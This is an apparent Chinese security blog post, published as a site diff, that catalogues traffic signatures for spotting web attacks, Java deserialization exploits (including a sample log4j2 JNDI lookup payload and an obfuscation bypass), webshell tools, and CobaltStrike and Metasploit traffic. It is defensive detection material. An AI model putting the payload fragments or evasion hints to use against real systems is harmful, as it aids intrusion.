@@ -1,0 +1,1387 @@
+<!DOCTYPE html>
+<html><head>
+<title>攻击流量特征</title>
+
+
+
+
+<meta charset="utf-8">
+<meta name="X-UA-Compatible" content="IE=edge">
+<meta name="google-site-verification" content="">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+<meta content="telephone=no" name="format-detection">
+<meta name="description" content="传统漏洞的流量特征，java 反序列化漏洞的流量特征，webshell 工具的流量特征，以及 CobaltStrike 等红队工具的流量特征">
+<meta name="renderer" content="webkit">
+<meta name="theme-color" content="#ffffff">
+
+
+
+<meta property="og:title" content="攻击流量特征" />
+<meta property="og:description" content="传统漏洞的流量特征，java 反序列化漏洞的流量特征，webshell 工具的流量特征，以及 CobaltStrike 等红队工具的流量特征" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xxxhidexxx.github.io/posts/sec/char/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-04-18T00:00:00+00:00" /><meta property="og:site_name" content="My Blog" />
+
+
+
+
+
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="攻击流量特征"/>
+<meta name="twitter:description" content="传统漏洞的流量特征，java 反序列化漏洞的流量特征，webshell 工具的流量特征，以及 CobaltStrike 等红队工具的流量特征"/>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+  (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "abcdefghzd");
+</script>
+
+
+
+  
+
+
+
+
+
+
+      <script src="/js/toc.js"></script>
+    
+    <link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">
+
+<link rel="stylesheet" href="/scss/dark-mode.min.cb53f1bee2b8900cb4f082afbf00175d6618f281cf9a2fe8619e3b52d20b5721.css" integrity="sha256-y1PxvuK4kAy08IKvvwAXXWYY8oHPmi/oYZ47UtILVyE=" media="screen">
+
+
+<link rel="stylesheet"
+          href="https://fonts.googleapis.com/css?family=Material+Icons">
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          
+          
+          delimiters: [
+              {left: '$$', right: '$$', display: true},
+              {left: '$', right: '$', display: false},
+              {left: '\\(', right: '\\)', display: false},
+              {left: '\\[', right: '\\]', display: true}
+          ],
+          
+          throwOnError : false
+        });
+    });
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+    	<div id="app"><div class="single-column-drawer-container" id="drawer"
+     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
+    <div class="drawer-content">
+        <div class="drawer-menu">
+            
+            
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/categories">
+                    分类
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/tags">
+                    标签
+                </a>
+                
+            
+            
+            <div class="toc">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- CATALOG -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e4%bc%a0%e7%bb%9f%e6%bc%8f%e6%b4%9e%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-传统漏洞的流量特征">
+									传统漏洞的流量特征
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#sqlxss" class="nav-sqlxss">
+									sql&amp;xss
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#rce" class="nav-rce">
+									rce
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" class="nav-文件包含">
+									文件包含
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6" class="nav-任意文件">
+									任意文件
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-java-反序列化漏洞的流量特征">
+									java 反序列化漏洞的流量特征
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%95%b0%e6%8d%ae%e4%bc%a0%e8%be%93" class="nav-java-反序列化数据传输">
+									java 反序列化数据传输
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#shiro" class="nav-shiro">
+									shiro
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#log4j2" class="nav-log4j2">
+									log4j2
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#fastjson" class="nav-fastjson">
+									fastjson
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#struts2" class="nav-struts2">
+									struts2
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#weblogic" class="nav-weblogic">
+									weblogic
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#webshell-%e5%b7%a5%e5%85%b7%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-webshell-工具的流量特征">
+									webshell 工具的流量特征
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e5%86%b0%e8%9d%8e-behinder" class="nav-冰蝎-behinder">
+									冰蝎 behinder
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e8%8f%9c%e5%88%80-caidao" class="nav-菜刀-caidao">
+									菜刀 caidao
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%93%a5%e6%96%af%e6%8b%89-godzilla" class="nav-哥斯拉-godzilla">
+									哥斯拉 godzilla
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e8%9a%81%e5%89%91-antsword" class="nav-蚁剑-antsword">
+									蚁剑 antsword
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#%e7%ba%a2%e9%98%9f%e5%b7%a5%e5%85%b7%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-红队工具流量特征">
+									红队工具流量特征
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#cobaltstrike" class="nav-cobaltstrike">
+									CobaltStrike
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#metasploit" class="nav-metasploit">
+									metasploit
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#nmapfscan" class="nav-nmapfscan">
+									nmap&amp;fscan
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#frp" class="nav-frp">
+									frp
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#nps" class="nav-nps">
+									nps
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+            
+        </div>
+    </div>
+</div>
+<transition name="fade">
+    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
+</transition>
+<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
+    <div id="navBackground" class="nav-background"></div>
+    <div class="container container-narrow nav-content">
+        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
+            <i class="material-icons">
+                menu
+            </i>
+        </button>
+        <a id="navTitle" class="navbar-brand" href="https://xxxhidexxx.github.io/">
+            write-up
+        </a>
+        
+        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
+            <i class="material-icons" id="darkModeToggleIcon2">
+                dark_mode
+            </i>
+        </button>
+        
+    </div>
+</nav>
+<div class="single-column-header-container" id="pageHead"
+     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
+    <a href="https://xxxhidexxx.github.io/">
+        <div class="single-column-header-title">write-up</div>
+        
+
+    </a>
+</div>
+
+            <div id="content">
+                <div id="streamContainer" class="stream-container">
+
+    <div class="post-list-container post-list-container-shadow">
+        <div class="post">
+            
+            
+            
+
+            <div class="post-head-wrapper-text-only"
+                
+            >
+                <div class="post-title">
+                    攻击流量特征
+                    
+                    <div class="post-subtitle">
+                        传统漏洞的流量特征，java 反序列化漏洞的流量特征，webshell 工具的流量特征，以及 CobaltStrike 等红队工具的流量特征
+                    </div>
+                    
+                    <div class="post-meta">
+                        
+                        <time itemprop="datePublished">
+                            2024-04-18 00:00
+                        </time>
+                        
+
+                        
+                            <i class="material-icons" style="">folder</i>
+                                <a href="/categories/sec">sec</a>
+                                &nbsp;
+                        
+
+                        
+                            <i class="material-icons" style="">label</i>
+                            
+                                <a href="/tags/%E8%93%9D%E9%98%9F%E7%90%86%E8%AE%BA">蓝队理论</a>
+                                &nbsp;
+                            
+                        
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="post-body-wrapper">
+                
+                <div class="post-body" v-pre>
+                
+                    <h3 id="传统漏洞的流量特征">传统漏洞的流量特征</h3>
+<h4 id="sqlxss">sql&amp;xss</h4>
+<p>请求包里面有明文 payload，攻击者会尝试很多次，很明显的特征。</p>
+<h4 id="rce">rce</h4>
+<p>这里只说最基础的，看到内网 ip 和 net user，curl，more，less 等 windows/linux 系统命令，或者 eval，system 等函数，则判断是 rce 攻击流量。</p>
+<h4 id="文件包含">文件包含</h4>
+<p>看到 require/include 等函数判断是文件包含攻击流量。</p>
+<h4 id="任意文件">任意文件</h4>
+<p>看到 /etc/passwd 等敏感目录，判断是任意文件读取/下载/删除攻击流量。</p>
+<p>看到上传文件的包里面有明文木马等恶意代码，判断是任意文件上传攻击流量。</p>
+<h3 id="java-反序列化漏洞的流量特征">java 反序列化漏洞的流量特征</h3>
+<p>主要考虑 struts2、shiro、weblogic、log4j2、fastjson 等组件及其历史漏洞的流量特征。</p>
+<h4 id="java-反序列化数据传输">java 反序列化数据传输</h4>
+<p>16 进制编码以 ac ed 00 05 开头，base64 编码为 rO0AB。</p>
+<p>有的 Content-Type: application/x-serialization 直接说明是 java 序列化数据包。</p>
+<h4 id="shiro">shiro</h4>
+<p>shiro 的 cookie 存在反序列化注入点。</p>
+<p>shiro 的流量特征是 cookie 有 rememberme 字段并使用 base64 编码。</p>
+<p>shiro550 和 shiro721 攻击方法的区别：550 密码撞库，721 填充攻击。</p>
+<p>如果 shiro cookie 正确，则返回包不会有 set-cookie: rememberme</p>
+<p>大部分 shiro 的响应包里面有回显。</p>
+<p>和运维确认 shiro 的版本，如果是 550 则对使用默认 key 的请求解密研判。</p>
+<h4 id="log4j2">log4j2</h4>
+<p>log4j2 的特征是 ${}，例如 ${jndi:ldap://0.0.0.0:80/exploit}</p>
+<p>log4j2 使用 jndi 注入，找恶意 url。</p>
+<p>log4j2 流量可以看到 rmi 或者 ldap 字样。</p>
+<p>log4j2 流量会出现 dns/ip 相关特征。</p>
+<p>log4j2 混淆绕过会使用冒号，例如 ${::::-j}${what:-n}</p>
+<p>log4j2 的影响范围包括：log4j1.x，spring boot，struts2, solr, vmware 产品线, flink, druid</p>
+<h4 id="fastjson">fastjson</h4>
+<p>fastjson 的强特征是 json 数据以 @type 开头。</p>
+<p>fastjson 用 json 传参，恶意流量的 json 参数含有 java 代码。</p>
+<p>fastjson 流量会看到 rmi 或者 ldap 字样。</p>
+<p>fastjson 的利用链 cc3、cc5 等，fastjson 有很多高危类。</p>
+<h4 id="struts2">struts2</h4>
+<p>struts 2 的特征是 %{}（或是其 url 编码 %25%7B&hellip;%7D），并且请求体和响应体都包含 payload。</p>
+<p>struts2 文件类型基本上是 .action 和 .jsp 文件。</p>
+<h4 id="weblogic">weblogic</h4>
+<p>无强特征，请求体和响应体看到 java 代码则预判为攻击流量。</p>
+<h3 id="webshell-工具的流量特征">webshell 工具的流量特征</h3>
+<p>这里说的 webshell 流量主要考虑：冰蝎、菜刀、哥斯拉、蚁剑。</p>
+<h4 id="冰蝎-behinder">冰蝎 behinder</h4>
+<p>冰蝎 2.0-4.0 使用 16 位 md5 作为 aes 密钥。冰蝎 webshell 的默认密钥是 e45e329feb5d925b，即 rebeyond 的 md5 前 16 位，也可能遇到 admin 的 16 位 md5。</p>
+<p>冰蝎 2.0-4.0 弱特征：同一个 ip 短时间频繁更换 user-agent。</p>
+<p>冰蝎 4.0 有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd。</p>
+<p>冰蝎 2.0-3.0 使用 aes 加密 + base64 编码；4.0 不再有连接密码的概念，自定义的传输协议算法就是连接密码。</p>
+<p>冰蝎 3.0 连接 jsp 的 webshell 的请求数据包中的 content-type 字段常见为 application/octet-stream。</p>
+<p>冰蝎 4.0 弱特征：Accept 字段为 Accept: application/json, text/javascript, /; q=0.01 意思是浏览器可以接受任何格式，但是更倾向于接受 application/json 和 text/javascript。</p>
+<p>冰蝎 4.0 会使用例如 49700 之类的比较大的端口进行 tcp 连接，且端口依次增加。</p>
+<p>冰蝎 4.0 使用长连接 Connection：Keep-Alive。</p>
+<h4 id="菜刀-caidao">菜刀 caidao</h4>
+<p>菜刀 php webshell 使用 base64 编码在请求体中对一句话木马进行明文传输，payload 解码后会看到 eval、assert、base64_decode 字样。响应体有两个竖杠||。会使用 base64_decode 函数进行打断 (&quot;@e&quot;.&ldquo;v&rdquo;.&ldquo;al&rdquo;)。</p>
+<p>菜刀 jsp webshell 的第一段链接流量会看到 i=A&amp;z0=GB2312 字样，第一个参数为 A-Q，第二个参数指定编码。有时会看到 z1、z2 参数写 payload。</p>
+<p>菜刀 asp webshell 会使用 unicode 编码，payload 使用一句话木马。</p>
+<h4 id="哥斯拉-godzilla">哥斯拉 godzilla</h4>
+<p>哥斯拉的强特征是 cookie 后面有个分号，目前版本的哥斯拉无法去除这个特征。</p>
+<p>哥斯拉的响应体的结构是 md5 前 16 位 + base64 + md5 后 16 位。</p>
+<p>哥斯拉默认的 user-agent 会暴露 jdk 信息，但是哥斯拉支持自定义请求头，所以攻击者可以去除这个特征。</p>
+<p>哥斯拉的 Accept字段默认是 Accept:text/html,image/gif,image/jpeg,*;q=.2,/;q=.2，但是同上，攻击者可以修改请求头信息，所以只作为一个辅助监测手段。</p>
+<p>哥斯拉会发三个特定请求。</p>
+<h4 id="蚁剑-antsword">蚁剑 antsword</h4>
+<p>蚁剑的请求体含有 ini_set、set_time_limit、display_errors 字样。</p>
+<p>蚁剑的 ua 头为 antsword/v2.1，但是攻击者可以去除这个特征。</p>
+<p>蚁剑的响应体为 base64 编码，随机数 + 结果 + 随机数。</p>
+<p>蚁剑的 php webshell 使用 eval 和 assert 函数；asp webshell 使用 assert 函数；jsp webshell 使用 java 类加载。</p>
+<p>蚁剑加密数据包的参数很多以 _0x&hellip; 的形式出现（下划线可替换为其他字符）。</p>
+<h3 id="红队工具流量特征">红队工具流量特征</h3>
+<h4 id="cobaltstrike">CobaltStrike</h4>
+<p>木马相关。</p>
+<p>默认 beacon 每隔六十秒发一个心跳包，通过 cookie 携带靶机信息。</p>
+<p>木马运行后会从指定服务器下载 stage，这个文件的大小约等于 211kb。下载路径是随机生成的，但是其 ascii 之和模 256 余 92。</p>
+<p>下发任务的方法是 c2 服务器在心跳包的响应里发送任务。</p>
+<p>beacon 使用 post 回传数据并且 url 为 /submit.php?id=</p>
+<p>stageless 阶段不需要下载 stage，但是可以看到 c2 服务器会返回 0.0.0.0 确认 beacon 上线。</p>
+<p>stageless 阶段的流量特征是使用 A/TXT/AAAA 三种方式发放 payload，且看到 ip 为 0.0.0.241/0.0.0.243/0.0.0.245。</p>
+<h4 id="metasploit">metasploit</h4>
+<p>木马相关。</p>
+<p>响应包有 MZ 标头和 cannot be run in DOS mode 字样。</p>
+<p>心跳包、固定 ua 头。</p>
+<h4 id="nmapfscan">nmap&amp;fscan</h4>
+<p>扫描相关。</p>
+<p>共同特征。开 wireshark，请求包看到 window:1024 和 options(4 bytes): tcp option。</p>
+<h4 id="frp">frp</h4>
+<p>隧道相关。</p>
+<p>连接成功会看到 run_id。</p>
+<h4 id="nps">nps</h4>
+<p>隧道相关。</p>
+<p>第一个请求包末尾有版本号，例如 0.26.1.0。</p>
+<p>第二个请求包有 32 为双向认证。</p>
+
+                    
+                    <HR width="100%" id="EOF">
+		    <p style="color:#777;">Last modified on 2024-04-18</p>
+                    
+                </div>
+            </div>
+            
+            
+            <nav class="post-pagination">
+
+                
+                <a class="newer-posts" href="/posts/sec/pdcerf/">
+			Next<br>应急响应流程以及相关问答
+                </a>
+                
+                
+                
+                <a class="older-posts" href="/posts/sec/top10/">
+			Previous<br>OWASP Top 10 选讲
+                </a>
+                
+            </nav>
+            <div class="post-comment-wrapper">
+                
+                <p style="opacity: 0.6" align="center">
+                    <small>Comments Disabled.</small>
+                </p>
+                
+            </div>
+        </div>
+    </div>
+
+
+                    </div>
+            </div><div id="sideContainer" class="side-container">
+    
+    <a class="a-block nav-head false" href="https://xxxhidexxx.github.io/">
+    
+        <div class="nav-title">
+            write-up
+        </div>
+        
+    </a>
+
+    <div class="nav-link-list">
+        
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/categories">
+                分类
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/tags">
+                标签
+            </a>
+            
+        
+    </div>
+
+    
+
+    <div class="nav-footer">
+        
+Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
+<br>
+Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	null
+	
+
+    </div>
+    
+</div><div id="extraContainer" class="extra-container">
+    <div class="toc-wrapper">
+        
+
+        
+        <div class="toc">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>- CATALOG -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e4%bc%a0%e7%bb%9f%e6%bc%8f%e6%b4%9e%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-传统漏洞的流量特征">
+									传统漏洞的流量特征
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#sqlxss" class="nav-sqlxss">
+									sql&amp;xss
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#rce" class="nav-rce">
+									rce
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" class="nav-文件包含">
+									文件包含
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6" class="nav-任意文件">
+									任意文件
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-java-反序列化漏洞的流量特征">
+									java 反序列化漏洞的流量特征
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%95%b0%e6%8d%ae%e4%bc%a0%e8%be%93" class="nav-java-反序列化数据传输">
+									java 反序列化数据传输
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#shiro" class="nav-shiro">
+									shiro
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#log4j2" class="nav-log4j2">
+									log4j2
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#fastjson" class="nav-fastjson">
+									fastjson
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#struts2" class="nav-struts2">
+									struts2
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#weblogic" class="nav-weblogic">
+									weblogic
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#webshell-%e5%b7%a5%e5%85%b7%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-webshell-工具的流量特征">
+									webshell 工具的流量特征
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e5%86%b0%e8%9d%8e-behinder" class="nav-冰蝎-behinder">
+									冰蝎 behinder
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e8%8f%9c%e5%88%80-caidao" class="nav-菜刀-caidao">
+									菜刀 caidao
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%93%a5%e6%96%af%e6%8b%89-godzilla" class="nav-哥斯拉-godzilla">
+									哥斯拉 godzilla
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e8%9a%81%e5%89%91-antsword" class="nav-蚁剑-antsword">
+									蚁剑 antsword
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#%e7%ba%a2%e9%98%9f%e5%b7%a5%e5%85%b7%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-红队工具流量特征">
+									红队工具流量特征
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#cobaltstrike" class="nav-cobaltstrike">
+									CobaltStrike
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#metasploit" class="nav-metasploit">
+									metasploit
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#nmapfscan" class="nav-nmapfscan">
+									nmap&amp;fscan
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#frp" class="nav-frp">
+									frp
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#nps" class="nav-nps">
+									nps
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+        
+    </div>
+    <div class="pagination">
+        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top"
+            :class="{ invisible: scrollY == 0 }">
+            <i class="material-icons pagination-action-icon">
+                keyboard_arrow_up
+            </i>
+        </a>
+        
+        <a type="button" class="pagination-action" id="darkModeToggleButton">
+            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
+                dark_mode
+            </span>
+        </a>
+        
+        
+    </div>
+</div><div id="single-column-footer">
+Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
+<br>
+Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	null
+	
+</div>
+            </div>
+    
+    <script src="/js/journal.js"></script></body>
+</html>
